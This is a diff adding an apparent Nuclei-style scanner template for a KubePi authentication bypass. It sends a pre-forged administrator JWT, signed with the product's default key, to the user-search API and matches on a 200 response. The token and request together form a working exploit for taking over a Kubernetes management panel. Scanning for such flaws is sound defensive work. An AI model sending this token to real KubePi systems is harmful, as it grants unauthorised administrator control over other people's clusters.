@@ -1,0 +1,26 @@
+id: KubePi-login-bypass
+info:
+  name: Template Name
+  author: wangzong
+  severity: info
+  description: KubePi 存在权限绕过漏洞，攻击者可通过默认 JWT 密钥获取管理员权限控制整个平台，使用管理员权限操作核心的功能。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/K2-1KubePi-Kubernetes%E5%8F%AF%E8%A7%86%E5%8C%96%E7%AE%A1%E7%90%86%E9%9D%A2%E6%9D%BF-PermissionAC?id=k2-1kubepi-kubernetes-%e5%8f%af%e8%a7%86%e5%8c%96%e7%ae%a1%e7%90%86%e9%9d%a2%e6%9d%bf-permissionac
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /kubepi/api/v1/users/search?pageNum=1&&pageSize=10 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8
+        Content-Type: application/json
+        Accept-Encoding: gzip
+        Content-Length: 4
+
+        {}
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
